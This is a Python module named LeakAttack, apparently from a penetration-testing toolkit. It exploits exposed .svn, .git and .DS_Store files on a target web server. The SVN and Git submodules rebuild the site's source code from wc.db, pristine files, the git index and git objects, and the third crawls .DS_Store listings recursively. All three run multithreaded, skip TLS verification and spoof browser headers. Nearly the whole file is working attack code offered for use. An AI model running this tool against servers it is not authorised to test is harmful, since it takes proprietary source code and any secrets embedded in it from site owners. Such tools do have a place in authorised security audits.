# coding=utf-8
from io import BytesIO

import requests
import threading
import sqlite3
import os
import re
import sys
import time
import zlib
import binascii
import collections
import mmap
import struct
import queue
from colorama import Fore, Style
from prettytable import PrettyTable
from urllib.parse import urlparse


# 颜色输出函数（与项目统一）
def print_green(text):
    print(Fore.GREEN + text + Style.RESET_ALL)


def print_red(text):
    print(Fore.RED + text + Style.RESET_ALL)


def print_cyan(text):
    print(Fore.CYAN + text + Style.RESET_ALL)


def print_yellow(text):
    print(Fore.YELLOW + text + Style.RESET_ALL)


# 全局配置
HEADER = {
    'accept': 'text/html,application/xhtml+xml,application/xml',
    'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Mobile Safari/537.36',
    'referer': 'http://baidu.com'
}


# ================== SVN泄露子模块 ==================
class SVNLeak:
    def __init__(self, target_url, thread_num=5):
        self.target_url = self._normalize_url(target_url)  # 规范化URL
        self.thread_num = thread_num
        self.db_path = ""  # wc.db本地路径
        self.save_root = ""  # 源码保存根目录

    # 规范化URL（确保以/.svn/结尾）
    def _normalize_url(self, url):
        parsed = urlparse(url)
        # 处理无协议URL
        if not parsed.scheme:
            url = f"http://{url}"
        # 确保以/.svn/结尾
        if not url.rstrip('/').endswith('.svn'):
            url = url.rstrip('/') + '/.svn/'
        else:
            url = url.rstrip('/') + '/'
        return url

    # 提取目标Host（用于创建保存目录）
    def _extract_host(self):
        parsed = urlparse(self.target_url)
        host = parsed.netloc.split(':')[0]  # 去除端口
        # 处理IP或域名格式
        if not host:
            host = re.search(r'(?:\d+\.){3}\d+|(?:\w+\.)+\w+', self.target_url)
            host = host.group() if host else "unknown_host"
        return host

    # 创建本地保存目录（避免重名）
    def _create_save_dir(self):
        host = self._extract_host()
        # 主目录：项目根目录下的leak_dump
        base_dir = "leak_dump/svn"
        if not os.path.exists(base_dir):
            os.makedirs(base_dir)

        # 处理重名目录（如host、host(1)、host(2)）
        self.save_root = f"{base_dir}/{host}"
        if os.path.exists(self.save_root):
            i = 1
            while os.path.exists(f"{base_dir}/{host}({i})"):
                i += 1
            self.save_root = f"{base_dir}/{host}({i})"
        os.makedirs(self.save_root)
        print_green(f"[+] 本地保存目录创建成功：{self.save_root}")

    # 下载wc.db（SVN 1.7+核心数据库）
    def _download_wc_db(self):
        db_url = f"{self.target_url}wc.db"
        self.db_path = f"{self.save_root}/wc.db"

        try:
            print_cyan(f"[*] 正在下载wc.db：{db_url}")
            response = requests.get(
                db_url,
                headers=HEADER,
                timeout=15,
                verify=False,
                allow_redirects=False
            )
            response.raise_for_status()  # 触发HTTP错误（404/500等）

            # 验证是否为SQLite文件（前16字节为SQLite签名）
            if not response.content.startswith(b"SQLite format 3"):
                raise Exception("文件不是有效的SQLite数据库")

            with open(self.db_path, "wb") as f:
                f.write(response.content)
            print_green(f"[+] wc.db下载成功：{self.db_path}")
            return True

        except Exception as e:
            print_red(f"[-] wc.db下载失败：{str(e)}")
            return False

    # 解析wc.db提取文件信息（SVN 1.7+）
    def _parse_wc_db(self):
        try:
            conn = sqlite3.connect(self.db_path, timeout=10)
            cursor = conn.cursor()
            # 查询NODES表：文件路径、类型、校验和
            cursor.execute("SELECT local_relpath, kind, checksum FROM NODES")
            results = cursor.fetchall()
            conn.close()

            if not results:
                print_red("[-] 未从wc.db中提取到任何文件信息")
                return None

            # 过滤空路径和无效数据
            valid_results = [r for r in results if r[0] and len(r[0]) < 256]
            print_green(f"[+] 从wc.db提取到{len(valid_results)}个文件/目录")
            return valid_results

        except sqlite3.Error as e:
            print_red(f"[-] 数据库解析失败：{str(e)}")
            return None

    # 多线程下载文件（SVN 1.7+）
    def _download_files_1_7(self, file_info_list):
        download_queue = self._init_queue(file_info_list)
        table_dump = PrettyTable(["文件名", "URL/类型", "下载状态"])

        # 线程工作函数
        def worker():
            while not download_queue.empty():
                file_path, file_type, checksum = download_queue.get()
                local_path = f"{self.save_root}/{file_path}"
                status = "失败"
                url = ""

                try:
                    if file_type == "dir":
                        # 创建目录
                        os.makedirs(local_path, exist_ok=True)
                        status = "目录创建成功"
                        url = "目录"
                    else:
                        # 跳过已删除文件（无校验和）
                        if not checksum or not checksum.startswith("$sha1$"):
                            status = "跳过（已删除/无校验和）"
                            url = "无"
                            continue

                        # 构建文件下载URL（pristine目录结构）
                        sha1 = checksum[6:]  # 去除前缀$sha1$
                        url = f"{self.target_url}pristine/{sha1[:2]}/{sha1}.svn-base"

                        # 下载文件
                        response = requests.get(url, headers=HEADER, timeout=10, verify=False)
                        response.raise_for_status()

                        # 创建父目录
                        os.makedirs(os.path.dirname(local_path), exist_ok=True)
                        # 保存文件
                        with open(local_path, "wb") as f:
                            f.write(response.content)
                        status = "成功"

                except Exception as e:
                    status = f"失败：{str(e)[:20]}"

                finally:
                    table_dump.add_row([file_path, url, status])
                    download_queue.task_done()

        # 启动线程
        print_cyan(f"[*] 启动{self.thread_num}个线程开始下载文件...")
        threads = []
        for _ in range(self.thread_num):
            t = threading.Thread(target=worker)
            t.daemon = True  # 守护线程：主程序退出时自动结束
            t.start()
            threads.append(t)
            time.sleep(0.1)  # 避免瞬间请求过多被拦截

        # 等待所有线程完成
        download_queue.join()
        print_cyan("\n[+] 所有下载任务完成！结果汇总：")
        print(table_dump)
        print_green(f"\n[+] 源码保存目录：{self.save_root}")

    # 处理SVN 1.7以下版本（通过entries文件遍历）
    def _handle_legacy_svn(self):
        print_yellow("[*] 检测到SVN 1.7以下版本，使用entries文件遍历模式")
        # 1. 解析根目录entries
        root_entries_url = f"{self.target_url}entries"
        try:
            response = requests.get(root_entries_url, headers=HEADER, timeout=10, verify=False)
            response.raise_for_status()

            # 解析entries文件（SVN 1.6及以下格式）
            entries_data = response.text.split('\n')
            file_list = []
            dir_list = []
            i = 0
            for item in entries_data:
                item = item.strip()
                if not item:
                    continue
                # 识别文件/目录（entries格式：名称\n类型\n...）
                if i % 8 == 0 and i + 1 < len(entries_data):
                    name = item
                    type_ = entries_data[i + 1].strip()
                    if type_ == "file" and name not in [".", "..", ".svn"]:
                        file_list.append(name)
                    elif type_ == "dir" and name not in [".", "..", ".svn"]:
                        dir_list.append(name)
                i += 1

            print_green(f"[+] 根目录提取：{len(file_list)}个文件，{len(dir_list)}个目录")
            # 此处简化处理，完整逻辑需递归解析子目录entries
            if file_list:
                print_yellow(f"[!] 简化模式：仅显示文件列表，未递归下载（完整功能需扩展）")
                for file in file_list:
                    print(f"  - {file}")
            return True

        except Exception as e:
            print_red(f"[-] 旧版本SVN处理失败：{str(e)}")
            return False

    # 初始化下载队列
    def _init_queue(self, data_list):
        q = queue.Queue()
        for item in data_list:
            q.put(item)
        return q

    # 检测SVN版本
    def _detect_svn_version(self):
        try:
            entries_url = f"{self.target_url}entries"
            response = requests.get(entries_url, headers=HEADER, timeout=10, verify=False)
            # SVN 1.7+的entries首行是"12\n"
            return response.content.startswith(b'12\n')
        except Exception as e:
            print_yellow(f"[!] 版本检测失败：{str(e)}，默认按1.7以下处理")
            return False

    # SVN泄露检测主入口
    def run(self):
        print_cyan("\n" + "=" * 80)
        print_cyan("          SVN泄露检测模块          ")
        print_cyan("=" * 80)
        print(f"[+] 目标URL：{self.target_url}")
        print(f"[+] 线程数：{self.thread_num}")

        # 1. 创建本地保存目录
        self._create_save_dir()

        # 2. 检测SVN版本
        is_1_7_plus = self._detect_svn_version()
        if is_1_7_plus:
            print_cyan("[*] 检测到SVN 1.7及以上版本")
            # 3. 下载并解析wc.db
            if not self._download_wc_db():
                return
            file_info = self._parse_wc_db()
            if not file_info:
                return
            # 4. 下载文件
            self._download_files_1_7(file_info)
        else:
            print_cyan("[*] 检测到SVN 1.7以下版本")
            self._handle_legacy_svn()


class GitLeak:
    def __init__(self, target_url, thread_num=10):
        self.target_url = self._normalize_url(target_url)
        self.thread_num = thread_num
        self.queue = queue.Queue()
        self.lock = threading.Lock()
        self.working_threads = 0
        self.stop_signal = False
        self.save_root = self._create_save_dir()  # Windows绝对路径（纯反斜杠）
        self.index_path = os.path.join(self.save_root, "index")  # 临时index文件路径
        self.index_file_handle = None

    # 1. 规范化目标URL
    def _normalize_url(self, url):
        parsed = urlparse(url)
        if not parsed.scheme:
            url = f"http://{url}"
        if not url.rstrip('/').endswith('.git'):
            url = url.rstrip('/') + '/.git/'
        else:
            url = url.rstrip('/') + '/'
        return url

    # 2. 创建保存目录（生成纯反斜杠的Windows绝对路径）
    def _create_save_dir(self):
        parsed = urlparse(self.target_url)
        host = parsed.netloc.split(':')[0].replace(':', '_')
        # 获取当前脚本所在目录的绝对路径（纯反斜杠）
        project_root = os.path.abspath(os.path.dirname(sys.argv[0])).replace('/', '\\')
        # 拼接保存目录（强制用反斜杠，避免混合）
        base_dir = os.path.join(project_root, f"leak_dump\\git\\{host}")  # 关键：用\\而非/
        if not os.path.exists(base_dir):
            os.makedirs(base_dir)
        # 确保最终路径是纯反斜杠（替换所有可能的/）
        return base_dir.replace('/', '\\')

    # 3. 路径验证（纯反斜杠匹配）
    def _is_valid_filename(self, filename):
        # 过滤路径穿越、绝对路径前缀
        if (filename.find('..') >= 0 or
            filename.startswith('/') or
            filename.startswith('\\') or
            any(c in filename for c in ['C:', 'D:', 'E:', 'F:'])):  # 过滤Windows盘符
            print_red(f"[!] 无效条目（路径穿越/绝对路径）：{filename}")
            return False

        # 处理文件名中的斜杠（统一转为反斜杠，避免混合）
        filename_win = filename.replace('/', '\\')  # 关键：将/转为\
        # 生成文件的绝对路径（纯反斜杠）
        file_abs_path = os.path.abspath(os.path.join(self.save_root, filename_win)).replace('/', '\\')
        # 生成允许范围的绝对路径（保存目录+反斜杠，纯反斜杠）
        save_root_with_sep = self.save_root + '\\'  # 强制添加反斜杠

        # 验证文件路径是否在允许范围内（纯反斜杠前缀匹配）
        if file_abs_path.startswith(save_root_with_sep):
            return True
        else:
            print_red(f"[!] 路径越界：{filename}")
            print_red(f"    - 实际绝对路径：{file_abs_path}")
            print_red(f"    - 允许范围：{save_root_with_sep}")
            return False

    # 4. 解析Git索引文件
    def _parse_index(self, pretty=True):
        if self.index_file_handle and not self.index_file_handle.closed:
            self.index_file_handle.close()

        try:
            self.index_file_handle = open(self.index_path, "rb")
            f = mmap.mmap(self.index_file_handle.fileno(), 0, access=mmap.ACCESS_READ)
        except Exception as e:
            raise Exception(f"打开index文件失败：{str(e)}")

        def read(format):
            format = "! " + format
            bytes_data = f.read(struct.calcsize(format))
            return struct.unpack(format, bytes_data)[0]

        # 验证签名
        signature = f.read(4).decode("ascii")
        if signature != "DIRC":
            f.close()
            raise Exception(f"无效Git索引文件（签名：{signature}，预期：DIRC）")

        # 验证版本
        version = read("I")
        if version not in {2, 3}:
            f.close()
            raise Exception(f"不支持的索引版本：v{version}（仅支持v2/v3）")

        # 读取条目数
        entries_count = read("I")
        print_green(f"[+] 索引文件信息：v{version}版本，共{entries_count}个条目")

        # 解析每个条目
        for entry_idx in range(entries_count):
            entry = {}
            entry["entry_id"] = entry_idx + 1

            # 处理时间（修复int切片）
            ctime_sec = read("I")
            ctime_ns = read("I")
            if pretty:
                entry["ctime"] = f"{ctime_sec}.{str(ctime_ns)[:6]}"
            else:
                entry["ctime_sec"] = ctime_sec
                entry["ctime_ns"] = ctime_ns

            mtime_sec = read("I")
            mtime_ns = read("I")
            if pretty:
                entry["mtime"] = f"{mtime_sec}.{str(mtime_ns)[:6]}"
            else:
                entry["mtime_sec"] = mtime_sec
                entry["mtime_ns"] = mtime_ns

            # 读取元数据
            entry["dev"] = read("I")
            entry["ino"] = read("I")
            entry["mode"] = read("I")
            entry["uid"] = read("I")
            entry["gid"] = read("I")
            entry["size"] = read("I")

            # 读取SHA-1
            entry["sha1"] = binascii.hexlify(f.read(20)).decode("ascii")
            # 读取标志位
            entry["flags"] = read("H")

            # 解析文件名长度
            namelen = entry["flags"] & 0xFFF
            entrylen = 62
            if (entry["flags"] & (0b01000000 << 8)) and version == 3:
                entry["extra_flags"] = read("H")
                entrylen += 2

            # 解析文件名
            if namelen < 0xFFF:
                name_bytes = f.read(namelen)
                entry["name"] = name_bytes.decode("utf-8", "replace")
                entrylen += namelen
            else:
                name_bytes = []
                while True:
                    byte = f.read(1)
                    if byte == b"\x00":
                        break
                    name_bytes.append(byte)
                entry["name"] = b"".join(name_bytes).decode("utf-8", "replace")
                entrylen += len(name_bytes) + 1

            # 验证填充
            padlen = (8 - (entrylen % 8)) or 8
            pad_bytes = f.read(padlen)
            for byte in pad_bytes:
                if byte != 0x00:
                    f.close()
                    raise Exception(f"条目{entry['entry_id']}填充错误：0x{byte:02x}")

            yield entry

        f.close()
        self.index_file_handle.close()
        self.index_file_handle = None

    # 5. 下载Git对象
    def _download_object(self, sha1, filename):
        try:
            # 构建对象URL
            object_url = f"{self.target_url}objects/{sha1[:2]}/{sha1[2:]}"
            response = requests.get(
                object_url,
                headers=HEADER,
                timeout=10,
                verify=False,
                allow_redirects=False
            )
            response.raise_for_status()

            # 解压
            try:
                decompressed = zlib.decompress(response.content)
            except zlib.error as e:
                return False, f"解压失败：{str(e)}"

            # 移除头部
            header_end = decompressed.find(b"\x00")
            if header_end == -1:
                return False, "无终止符"
            file_content = decompressed[header_end + 1:]

            # 保存文件（适配Windows路径）
            filename_win = filename.replace('/', '\\')  # 文件名中的/转为\
            save_path = os.path.join(self.save_root, filename_win)
            os.makedirs(os.path.dirname(save_path), exist_ok=True)
            with open(save_path, "wb") as f:
                f.write(file_content)

            return True, "成功"

        except requests.exceptions.HTTPError as e:
            return False, f"HTTP {e.response.status_code}"
        except Exception as e:
            return False, f"错误：{str(e)[:20]}"

    # 6. 线程工作函数
    def _worker(self):
        while not self.stop_signal:
            try:
                sha1, filename = self.queue.get(timeout=0.5)
            except queue.Empty:
                break

            for retry in range(3):
                success, msg = self._download_object(sha1, filename)
                with self.lock:
                    if success:
                        print_green(f"[+] {filename}")
                        break
                    else:
                        print_yellow(f"[!] 重试{retry+1}/3 | {filename} | {msg}")
                        if "404" in msg:
                            break

            self.queue.task_done()

        with self.lock:
            self.working_threads -= 1

    # 7. 下载并解析index文件
    def _download_and_parse_index(self):
        # 清理残留
        if self.index_file_handle and not self.index_file_handle.closed:
            self.index_file_handle.close()
        if os.path.exists(self.index_path):
            try:
                os.remove(self.index_path)
            except Exception as e:
                print_yellow(f"[!] 清理残留index：{str(e)}")

        try:
            # 下载index
            index_url = f"{self.target_url}index"
            print_cyan(f"[*] 下载index：{index_url}")
            response = requests.get(
                index_url,
                headers=HEADER,
                timeout=15,
                verify=False
            )
            response.raise_for_status()

            # 验证大小
            if len(response.content) < 16:
                raise Exception(f"index过小（{len(response.content)}字节）")

            # 保存index
            with open(self.index_path, "wb") as f:
                f.write(response.content)

            # 解析并统计
            file_count = 0
            filtered_count = 0
            for entry in self._parse_index():
                if "sha1" in entry and "name" in entry:
                    filename = entry["name"].strip()
                    if self._is_valid_filename(filename):
                        self.queue.put((entry["sha1"].strip(), filename))
                        file_count += 1
                        if file_count % 50 == 0:
                            with self.lock:
                                print_cyan(f"[*] 已添加{file_count}个有效任务")
                    else:
                        filtered_count += 1

            # 验证有效条目
            if file_count == 0:
                raise Exception(
                    f"无有效条目（总{file_count+filtered_count}，过滤{filtered_count}）"
                )

            print_green(f"\n[+] 过滤完成：有效{file_count}个，过滤{filtered_count}个")
            print_green(f"[+] 启动{self.thread_num}线程下载...")
            return True

        except Exception as e:
            print_red(f"[-] 下载/解析失败: {str(e)}")
            # 清理
            if self.index_file_handle and not self.index_file_handle.closed:
                self.index_file_handle.close()
            if os.path.exists(self.index_path):
                try:
                    os.remove(self.index_path)
                except Exception as del_e:
                    print_red(f"[-] 清理index：{str(del_e)}")
            return False

    # 8. 主执行入口
    def run(self):
        print_cyan("\n" + "="*80)
        print_cyan("          Git泄露检测模块（Windows最终修复版）          ")
        print_cyan("="*80)
        print(f"[+] 目标URL：{self.target_url}")
        print(f"[+] 线程数：{self.thread_num}")
        print(f"[+] 保存目录（绝对路径）：{self.save_root}")

        if not self._download_and_parse_index():
            print_red("\n[-] 任务终止：无有效文件")
            return

        # 启动线程
        self.working_threads = self.thread_num
        threads = []
        for _ in range(self.thread_num):
            t = threading.Thread(target=self._worker)
            t.daemon = True
            t.start()
            threads.append(t)
            time.sleep(0.1)

        # 等待完成
        try:
            self.queue.join()
            while self.working_threads > 0:
                time.sleep(0.1)
            print_cyan("\n" + "="*80)
            print_green(f"[+] 任务完成！文件保存至：{self.save_root}")
            print_cyan("="*80)

        except KeyboardInterrupt:
            self.stop_signal = True
            print_red("\n[!] 用户中断")
            print_yellow(f"[!] 部分文件已保存至：{self.save_root}")

        finally:
            # 最终清理
            if self.index_file_handle and not self.index_file_handle.closed:
                self.index_file_handle.close()
            if os.path.exists(self.index_path):
                try:
                    os.remove(self.index_path)
                except Exception as e:
                    print_yellow(f"[!] 清理index失败：{str(e)}，请手动删除")


# ================== .DS_Store泄露子模块 ==================
class DSStoreLeak:
    def __init__(self, target_url, thread_num=10):
        self.target_url = self._normalize_url(target_url)
        self.thread_num = thread_num
        self.queue = queue.Queue()
        self.processed_urls = set()
        self.lock = threading.Lock()
        self.working_threads = 0
        self.save_root = self._create_save_dir()

    # 规范化URL（确保以.DS_Store结尾）
    def _normalize_url(self, url):
        parsed = urlparse(url)
        # 补全协议
        if not parsed.scheme:
            url = f"http://{url}"
        # 确保以.DS_Store结尾
        if not url.endswith('.DS_Store'):
            url = url.rstrip('/') + '/.DS_Store'
        return url

    # 创建本地保存目录
    def _create_save_dir(self):
        parsed = urlparse(self.target_url)
        host = parsed.netloc.split(':')[0]
        # 保存路径：leak_dump/ds_store/host/
        base_dir = f"leak_dump/ds_store/{host}"
        if not os.path.exists(base_dir):
            os.makedirs(base_dir)
        print_green(f"[+] 本地保存目录：{base_dir}")
        return base_dir

    # 验证文件/目录名合法性（防止路径穿越）
    def _is_valid_name(self, entry_name):
        if (entry_name.find('..') >= 0 or
                entry_name.startswith('/') or
                entry_name.startswith('\\')):
            print_red(f"[!] 无效的条目名（可能存在路径穿越）：{entry_name}")
            return False
        # 验证绝对路径是否在保存目录内
        abs_path = os.path.abspath(os.path.join(self.save_root, entry_name))
        if not abs_path.startswith(self.save_root):
            print_red(f"[!] 路径越界：{entry_name}")
            return False
        return True

    # 线程工作函数：处理队列中的URL
    def _worker(self):
        while True:
            try:
                # 从队列获取URL，超时2秒
                url = self.queue.get(timeout=2.0)
                with self.lock:
                    self.working_threads += 1
            except queue.Empty:
                # 队列为空且所有工作线程结束
                if self.working_threads == 0:
                    break
                continue

            try:
                # 跳过已处理的URL
                if url in self.processed_urls:
                    continue
                self.processed_urls.add(url)

                # 发送请求获取内容
                print_cyan(f"[*] 正在处理：{url}")
                response = requests.get(
                    url,
                    headers=HEADER,
                    timeout=10,
                    verify=False,
                    allow_redirects=False
                )

                if response.status_code == 200:
                    # 保存.DS_Store文件
                    parsed_url = urlparse(url)
                    save_path = os.path.join(self.save_root, parsed_url.path.lstrip('/'))
                    # 创建父目录
                    os.makedirs(os.path.dirname(save_path), exist_ok=True)
                    with open(save_path, 'wb') as f:
                        f.write(response.content)
                    print_green(f"[+] 成功下载：{url} -> {save_path}")

                    # 如果是.DS_Store文件，解析并发现新文件/目录
                    if url.endswith('.DS_Store'):
                        self._parse_ds_store(response.content, url)

                else:
                    print_yellow(f"[-] 下载失败（状态码：{response.status_code}）：{url}")

            except Exception as e:
                print_red(f"[-] 处理{url}出错：{str(e)}")

            finally:
                with self.lock:
                    self.working_threads -= 1
                self.queue.task_done()

    # 解析.DS_Store文件，提取文件/目录信息
    def _parse_ds_store(self, content, base_url):
        try:
            # 动态导入ds_store模块（避免未安装时影响其他功能）
            from ds_store import DSStore

            # 从内存中解析DS_Store
            ds_store = DSStore.open(BytesIO(content))
            entries = set()

            # 遍历所有条目
            for entry in ds_store._traverse(None):
                if self._is_valid_name(entry.filename) and entry.filename != '.':
                    entries.add(entry.filename)

            # 生成新的URL并加入队列
            base_path = base_url.rstrip('.DS_Store')
            for entry in entries:
                # 添加文件URL
                file_url = f"{base_path}{entry}"
                if file_url not in self.processed_urls:
                    self.queue.put(file_url)

                # 对目录添加其.DS_Store URL（递归扫描）
                # 简单判断：不含扩展名的视为目录
                if '.' not in entry:
                    dir_ds_url = f"{base_path}{entry}/.DS_Store"
                    if dir_ds_url not in self.processed_urls:
                        self.queue.put(dir_ds_url)

            print_green(f"[+] 从{base_url}提取到{len(entries)}个条目，已加入下载队列")
            ds_store.close()

        except ImportError:
            print_red("[-] 缺少ds_store模块，请先安装：pip install ds-store")
        except Exception as e:
            print_red(f"[-] 解析.DS_Store失败：{str(e)}")

    # 启动多线程扫描
    def run(self):
        print_cyan("\n" + "=" * 80)
        print_cyan("          .DS_Store泄露检测模块          ")
        print_cyan("=" * 80)
        print(f"[+] 目标URL：{self.target_url}")
        print(f"[+] 线程数：{self.thread_num}")

        # 将初始URL加入队列
        self.queue.put(self.target_url)

        # 启动工作线程
        threads = []
        for _ in range(self.thread_num):
            t = threading.Thread(target=self._worker)
            t.daemon = True
            t.start()
            threads.append(t)
            time.sleep(0.1)

        # 等待所有任务完成
        self.queue.join()
        print_cyan("\n[+] 所有.DS_Store泄露检测任务已完成")
        print_green(f"[+] 下载的文件保存在：{self.save_root}")


# ================== LeakAttack主模块 ==================
class LeakAttack:
    def __init__(self, args):
        self.args = args
        self.target_url = self._get_target_url()
        self.submodules = {
            "1": ["svn", "SVN泄露检测（提取源码）"],
            "2": ["git", "Git泄露检测（通过.git目录恢复文件）"],
            "3": ["ds_store", ".DS_Store泄露检测（递归下载文件）"]
        }

    # 获取目标URL（从args提取）
    def _get_target_url(self):
        if self.args.url:
            return self.args.url
        elif self.args.ip:
            return f"http://{self.args.ip}"
        else:
            raise Exception("未指定目标，请通过-u（URL）或-i（IP）参数指定")

    # 选择子模块
    def select_submodule(self):
        print_cyan("\n" + "=" * 80)
        print_cyan("          信息泄露攻击模块          ")
        print_cyan("=" * 80)
        print_cyan("\n可用子模块：")
        for num, (name, desc) in self.submodules.items():
            print(f"{num}. {name.ljust(10)} - {desc}")

        while True:
            choice = input("\n请输入子模块编号（1-3）: ").strip()
            if choice in self.submodules:
                return self.submodules[choice][0]
            else:
                print_red("无效选项，请输入1-3之间的数字！")

    # 配置线程数（通用配置）
    def _config_threads(self, module_name, default=5, max_threads=20):
        print_cyan(f"\n[*] {module_name}模块配置")
        while True:
            thread_input = input(f"请输入线程数（1-{max_threads}，默认{default}）: ").strip()
            if not thread_input:
                return default
            if thread_input.isdigit():
                thread_num = int(thread_input)
                if 1 <= thread_num <= max_threads:
                    return thread_num
                else:
                    print_red(f"线程数需在1-{max_threads}之间！")
            else:
                print_red("无效输入，请输入数字！")

    # 主执行逻辑
    def run(self):
        try:
            # 1. 选择子模块
            submodule = self.select_submodule()
            # 2. 执行对应模块
            if submodule == "svn":
                thread_num = self._config_threads("SVN", default=5)
                svn_leak = SVNLeak(self.target_url, thread_num)
                svn_leak.run()
            elif submodule == "git":
                thread_num = self._config_threads("Git", default=10, max_threads=30)
                git_leak = GitLeak(self.target_url, thread_num)
                git_leak.run()
            elif submodule == "ds_store":
                thread_num = self._config_threads(".DS_Store", default=10, max_threads=30)
                ds_store_leak = DSStoreLeak(self.target_url, thread_num)
                ds_store_leak.run()

        except Exception as e:
            print_red(f"[-] 模块执行失败：{str(e)}")


# 入口函数（供主程序调用）
def run_leakattack(args):
    leak_attack = LeakAttack(args)
    leak_attack.run()
